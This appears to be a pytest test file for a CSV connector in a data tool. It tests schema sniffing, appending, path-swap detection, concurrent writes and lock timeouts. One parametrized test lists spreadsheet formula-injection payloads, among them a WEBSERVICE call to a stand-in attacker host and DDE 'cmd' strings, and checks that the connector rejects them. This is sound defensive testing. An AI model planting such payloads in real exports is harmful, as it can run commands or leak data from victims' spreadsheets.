from __future__ import annotations

import multiprocessing

import pytest

from polymorph.connectors.csv_file import CsvConnector
from polymorph.errors import ConnectorError, ConnectorWriteError, WriteOutcome
from polymorph.filesystem import exclusive_path_lock
from polymorph.models.types import DataType, FieldRole, Sensitivity


def _append_csv_in_process(path, worker_id, ready, start, result) -> None:
    try:
        connector = CsvConnector(path, write_lock_timeout=20)
        connector.inspect_schema()
        ready.put(None)
        if not start.wait(20):
            raise TimeoutError("concurrent CSV test start was not released")
        for sequence in range(4):
            connector.write_records([{"writer": worker_id, "sequence": sequence, "value": "kept"}])
    except Exception as exc:
        if not start.is_set():
            ready.put(f"{type(exc).__name__}: {exc}")
        result.put(f"{type(exc).__name__}: {exc}")
    else:
        result.put(None)


def test_csv_sniffs_semicolon_and_preserves_natural_keys(tmp_path) -> None:
    path = tmp_path / "orders.csv"
    path.write_text(
        "Debitor Nr;Amount;API Token\n000042;12.50;secret-1\n000043;3.00;secret-2\n",
        encoding="utf-8",
    )
    connector = CsvConnector(path)
    schema = connector.inspect_schema()

    assert schema.metadata["delimiter"] == ";"
    assert schema.fields[0].role is FieldRole.NATURAL_KEY
    assert schema.fields[0].data_type is DataType.STRING
    assert schema.fields[2].sensitivity is Sensitivity.SECRET
    records = list(connector.iter_records())
    assert records[0]["c1"] == "000042"
    assert records[0]["c3"] == "secret-1"


def test_csv_repeated_header_is_skipped(tmp_path) -> None:
    path = tmp_path / "paged.csv"
    path.write_text("Name,Value\nA,1\nName,Value\nB,2\n", encoding="utf-8")
    records = list(CsvConnector(path).iter_records())
    assert records == [{"c1": "A", "c2": "1"}, {"c1": "B", "c2": "2"}]


def test_csv_write_rejects_shape_changes(tmp_path) -> None:
    path = tmp_path / "out.csv"
    path.write_text("a,b\n", encoding="utf-8")
    connector = CsvConnector(path)
    try:
        connector.write_records([{"a": 1, "b": 2}, {"a": 3}])
    except ValueError as exc:
        assert "identical fields" in str(exc)
    else:
        raise AssertionError("shape mismatch was not rejected")


def test_csv_can_create_new_destination(tmp_path) -> None:
    path = tmp_path / "new.csv"
    connector = CsvConnector(path)
    assert connector.write_records([{"name": "A", "value": 1}]) == 1
    assert path.read_text(encoding="utf-8-sig").startswith("name,value")


def test_csv_destination_appends_positional_records_to_existing_header(tmp_path) -> None:
    path = tmp_path / "out.csv"
    path.write_text("Name,Value\nAlice,1\n", encoding="utf-8")
    connector = CsvConnector(path)

    assert connector.write_records([{"c1": "Bob", "c2": 2}]) == 1

    assert list(connector.iter_records()) == [
        {"c1": "Alice", "c2": "1"},
        {"c1": "Bob", "c2": "2"},
    ]


def test_csv_structural_fingerprint_does_not_depend_on_filename(tmp_path) -> None:
    first = tmp_path / "upload-2026-09-08.csv"
    second = tmp_path / "upload-2026-09-09.csv"
    content = "Customer Number,Amount\nA-1,12.50\n"
    first.write_text(content, encoding="utf-8")
    second.write_text(content, encoding="utf-8")

    left = CsvConnector(first).inspect_schema()
    right = CsvConnector(second).inspect_schema()

    assert left.id != right.id
    assert left.fingerprint() != right.fingerprint()
    assert left.structural_fingerprint() == right.structural_fingerprint()


def test_csv_rejects_path_swap_after_content_gate(tmp_path) -> None:
    path = tmp_path / "source.csv"
    replacement = tmp_path / "replacement.csv"
    path.write_text("name,value\nAlice,1\n", encoding="utf-8")
    replacement.write_text("name,value\nMallory,999\n", encoding="utf-8")
    connector = CsvConnector(path)
    connector.inspect_schema()

    replacement.replace(path)

    with pytest.raises(ConnectorError, match="changed after content inspection"):
        connector.inspect_schema()
    with pytest.raises(ConnectorError, match="changed after content inspection"):
        list(connector.iter_records())


@pytest.mark.parametrize(
    "value",
    (
        '=WEBSERVICE("https://attacker.invalid/x")',
        "+cmd|' /C calc'!A0",
        "-2+3+cmd|' /C calc'!A0",
        "@SUM(1+1)",
        "\t=1+1",
        "\r=1+1",
    ),
)
def test_csv_destination_rejects_spreadsheet_formula_injection_by_default(
    tmp_path,
    value,
) -> None:
    path = tmp_path / "out.csv"

    with pytest.raises(ConnectorWriteError) as caught:
        CsvConnector(path).write_records([{"value": value}])

    assert caught.value.outcome is WriteOutcome.NOT_COMMITTED
    assert not path.exists()


def test_csv_destination_formula_opt_in_is_explicit(tmp_path) -> None:
    path = tmp_path / "out.csv"
    connector = CsvConnector(path, allow_spreadsheet_formulas=True)

    assert connector.write_records([{"value": "=1+1"}]) == 1
    assert "=1+1" in path.read_text(encoding="utf-8-sig")


def test_csv_concurrent_process_writers_do_not_lose_records(tmp_path) -> None:
    path = tmp_path / "concurrent.csv"
    path.write_text("writer,sequence,value\n-1,-1,seed\n", encoding="utf-8")
    process_count = 6
    context = multiprocessing.get_context("spawn")
    ready = context.Queue()
    start = context.Event()
    result = context.Queue()
    processes = [
        context.Process(
            target=_append_csv_in_process,
            args=(str(path), worker_id, ready, start, result),
        )
        for worker_id in range(process_count)
    ]
    for process in processes:
        process.start()
    readiness = [ready.get(timeout=20) for _ in processes]
    start.set()
    for process in processes:
        process.join(30)

    stuck = [process for process in processes if process.is_alive()]
    for process in stuck:
        process.terminate()
        process.join(5)
    assert not stuck
    assert readiness == [None] * process_count
    assert [process.exitcode for process in processes] == [0] * process_count
    assert [result.get(timeout=5) for _ in processes] == [None] * process_count
    records = list(CsvConnector(path).iter_records())
    observed = {(int(record["c1"]), int(record["c2"])) for record in records}
    expected = {
        (worker_id, sequence) for worker_id in range(process_count) for sequence in range(4)
    }
    expected.add((-1, -1))
    assert observed == expected
    assert len(records) == len(expected)


def test_csv_lock_timeout_is_proven_not_committed(tmp_path) -> None:
    path = tmp_path / "busy.csv"

    with exclusive_path_lock(path), pytest.raises(ConnectorWriteError) as caught:
        CsvConnector(path, write_lock_timeout=0.01).write_records([{"value": "safe"}])

    assert caught.value.outcome is WriteOutcome.NOT_COMMITTED
    assert not path.exists()


@pytest.mark.parametrize("timeout", (-1.0, float("inf"), float("nan")))
def test_csv_rejects_unsafe_write_lock_timeout(tmp_path, timeout) -> None:
    with pytest.raises(ValueError, match="finite non-negative"):
        CsvConnector(tmp_path / "out.csv", write_lock_timeout=timeout)
